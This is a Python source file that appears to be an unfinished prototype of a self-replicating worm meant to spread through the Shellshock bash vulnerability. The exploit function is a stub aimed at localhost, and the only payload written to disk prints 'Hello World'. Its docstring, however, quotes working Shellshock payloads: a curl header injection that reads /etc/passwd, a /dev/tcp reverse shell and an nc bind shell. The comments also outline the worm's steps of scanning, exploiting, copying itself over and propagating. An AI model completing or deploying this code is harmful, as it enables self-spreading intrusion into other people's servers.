#!/usr/bin/env python3

import os, sys # TODO: use subprocess instead of os (?)
from datetime import datetime

# Test payload information
payload_name = 'test_payload'
payload_content = "print('Hello World')"

# Worm tracking information
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open('log','x')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	try:
		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
		f.write(payload_content)
		f.close()
	except:
		# This can potentially check if a host has been infected, but the method isn't robust
		print(f'{payload_name} already exists!')
		sys.exit(0)

# Executes payload on host
def execute_payload():
	exec(open(payload_name).read())
	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
	log()

# Rudimentary way to make a LOCAL copy of itself when executed
def local_replicate():
	script = sys.argv
	name = script[0] # type: string

	os.mkdir('test')
	os.system('cp ' + name + ' test')

# Prototype for shellshock exploit via python
def exploit():
	"""
	# Shellshock Exploit References

	https://github.com/binexisHATT/Exploits/blob/master/shellshock.py
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh                                                                
		exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
		exploit += '\'' + cmd + '\'"'
		exploit += ' ' + url
		subprocess.run(exploit, shell=True)

	https://www.exploit-db.com/exploits/34900
		headers = {"Cookie": payload, "Referer": payload}
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	"""

	targetIPs = ['127.0.0.1'] # Hardcoding this for now
	vulnerable_path = ['/cgi-bin/admin.cgi'] # Hardcoding this for now
	# TODO: make it work

def main():
	# TODO:
	# - Also implement something so worm doesn't infect the computer that started it
	#
	# checkifrunning() # if worm already exists on host, then exit
	# gettargetIPs() # for now/simplicity/POC, just check if port 80 is open
	# shellshockvulnscan(targetIPs) # check common cgi paths for shellshock vuln
	#	returns target ip with its associated vulnerable path (if none, then exit program)
	# createpayloadarray()
	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself


	exploit()
	copy_payload()
	execute_payload()
	local_replicate() # This will not be necessary
	

	"""
	Making a copy of itself on vulnerable host:
	1) Identify RCE vulnerability
	2) Bring this script to host using RCE vulnerability (eg. echo [contents] > /tmp/worm)
	3) Execute /tmp/worm on vulnerable host
	4) This will propagage
	"""

main()
